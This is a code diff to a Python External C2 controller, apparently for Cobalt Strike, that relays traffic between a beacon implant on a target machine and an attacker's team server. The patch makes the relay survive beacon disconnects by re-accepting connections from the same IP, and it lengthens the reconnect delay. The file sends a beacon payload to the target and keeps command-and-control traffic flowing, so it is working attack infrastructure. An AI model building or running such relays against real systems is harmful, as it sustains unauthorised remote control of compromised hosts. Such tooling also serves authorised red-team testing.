@@ -136,6 +136,8 @@ class ExternalC2Controller:
         except:
             print("Recv failed.")
             return None
+        if data_length == b'':
+            return None
         len = struct.unpack("<I", data_length)
         # Unpack returns a tuple
         data = self._socketBeacon.recv(len[0])
@@ -173,12 +175,20 @@ class ExternalC2Controller:
 
         # Send beacon payload to target
         self.sendToBeacon(tcpinfo, data)
+        current_beacon_ip = beacon_addr[0]
 
         while True:
+
             data = self.recvFromBeacon(tcpinfo)
             if data == None:
-                print("Error/exit from beacon")
-                break
+                print("Disconnected from beacon")
+                self._socketBeacon, beacon_addr = self._socketServer.accept()
+                print("Connected to : {}".format(beacon_addr))
+                if current_beacon_ip == beacon_addr[0]:
+                    continue
+                else:
+                    print("Error: new connection. Exiting..")
+                    break
             print("Received %d bytes from beacon" % len(data))
 
             print("Sending %d bytes to TS" % len(data))
@@ -208,5 +218,5 @@ controller = ExternalC2Controller(args.teamserver_port)
 tcpinfo = TCPinfo(args.ts_ip, args.teamserver_port, args.srv_ip, args.srv_port, args.pipe_str)
 while True:
     controller.run(tcpinfo, 'x86')
-    print('waiting 1s before reconnecting to TS')
-    time.sleep(1)
+    print('waiting 10s before reconnecting to TS')
+    time.sleep(10)
